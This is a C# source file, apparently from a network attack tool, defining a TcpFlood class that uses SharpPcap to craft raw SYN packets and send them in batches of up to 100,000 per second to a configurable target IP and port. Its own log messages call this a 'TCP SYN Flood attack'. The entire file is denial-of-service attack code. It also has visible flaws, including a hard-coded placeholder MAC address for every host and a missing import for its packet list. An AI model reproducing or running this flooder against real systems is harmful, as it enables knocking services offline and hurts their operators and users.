using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;

namespace Dorothy.Models
{
    public class TcpFlood : IDisposable
    {
        private readonly string _sourceIp;
        private readonly string _targetIp;
        private readonly int _targetPort;
        private readonly long _megabitsPerSecond;
        private readonly CancellationToken _token;
        private readonly Action<string> _logAction;
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();

        public TcpFlood(string sourceIp, string targetIp, int targetPort, long megabitsPerSecond, CancellationToken token, Action<string> logAction)
        {
            _sourceIp = sourceIp;
            _targetIp = targetIp;
            _targetPort = targetPort;
            _megabitsPerSecond = megabitsPerSecond;
            _token = token;
            _logAction = logAction;
        }

        public async Task StartAsync()
        {
            try
            {
                // Calculate packets per second based on Mbps
                long bytesPerSecond = _megabitsPerSecond * 125_000; // 1 Mbps = 125,000 Bytes
                int packetsPerSecond = (int)(bytesPerSecond / 64); // Approximate size per SYN packet (IP + TCP headers)

                // Cap the packets per second to prevent system overload
                packetsPerSecond = Math.Min(packetsPerSecond, 100_000); // Example cap at 100,000 packets/sec
                if (packetsPerSecond <= 0) packetsPerSecond = 1;

                _logAction?.Invoke($"TCP SYN Flood: Sending {packetsPerSecond} SYN packets per second ({_megabitsPerSecond} Mbps).");

                // Initialize SharpPcap device
                var devices = CaptureDeviceList.Instance;
                if (devices.Count < 1)
                {
                    Log("No capture devices found.");
                    return;
                }

                // Select the first device (modify as needed)
                var device = devices[0];
                device.Open();

                // Resolve MAC addresses using ARP or set manually
                System.Net.NetworkInformation.PhysicalAddress targetMac = GetMacAddress(_targetIp);
                if (targetMac == null)
                {
                    Log($"Failed to resolve MAC address for {_targetIp}.");
                    return;
                }

                System.Net.NetworkInformation.PhysicalAddress sourceMac = GetMacAddress(_sourceIp); // Ensure this is set correctly

                var sourceIpAddress = IPAddress.Parse(_sourceIp);
                var targetIpAddress = IPAddress.Parse(_targetIp);

                while (!_token.IsCancellationRequested)
                {
                    var synPackets = new List<Packet>();

                    for (int i = 0; i < packetsPerSecond; i++)
                    {
                        // Build Ethernet Layer
                        var ethernet = new EthernetPacket(sourceMac, targetMac, EthernetType.IPv4);

                        // Build IP Layer
                        var ipLayer = new IPv4Packet(sourceIpAddress, targetIpAddress)
                        {
                            Protocol = PacketDotNet.ProtocolType.Tcp,
                            TimeToLive = 128
                        };

                        // Build TCP Layer
                        var tcpLayer = new TcpPacket(0, (ushort)_targetPort)
                        {
                            SequenceNumber = (uint)new Random().Next(0, int.MaxValue),
                            WindowSize = 64240,
                            Synchronize = true
                        };

                        // No payload for SYN packet

                        // Combine layers
                        ipLayer.PayloadPacket = tcpLayer;
                        ethernet.PayloadPacket = ipLayer;

                        synPackets.Add(ethernet);
                    }

                    // Send all SYN packets
                    foreach (var pkt in synPackets)
                    {
                        device.SendPacket(pkt);
                    }

                    _logAction?.Invoke($"TCP SYN Flood: Sent {packetsPerSecond} SYN packets.");

                    // Wait for 1 second before sending the next batch
                    await Task.Delay(1000, _token);
                }

                device.Close();
            }
            catch (OperationCanceledException)
            {
                Log("TCP SYN Flood attack canceled.");
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Error during TCP SYN Flood.");
                _logAction?.Invoke($"TCP SYN Flood attack error: {ex.Message}");
            }
            finally
            {
                Log("TCP SYN Flood attack stopped.");
            }
        }

        private System.Net.NetworkInformation.PhysicalAddress GetMacAddress(string ipAddress)
        {
            // Implement ARP resolution or use a static MAC address
            // For simplicity, using a placeholder MAC address
            return new System.Net.NetworkInformation.PhysicalAddress(new byte[] { 0x00, 0x0C, 0x29, 0x3E, 0x1C, 0x2B });
        }

        private void Log(string message)
        {
            try
            {
                var timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                var logMessage = $"[{timestamp}] {message}\n";

                // Assuming _logAction handles UI logging
                _logAction?.Invoke(logMessage);

                Logger.Debug(message);
            }
            catch (Exception ex)
            {
                // Fallback logging in case of failure
                Logger.Error(ex, "Logging failed.");
            }
        }

        public void Dispose()
        {
            // Implement disposal logic if needed
        }
    }
}
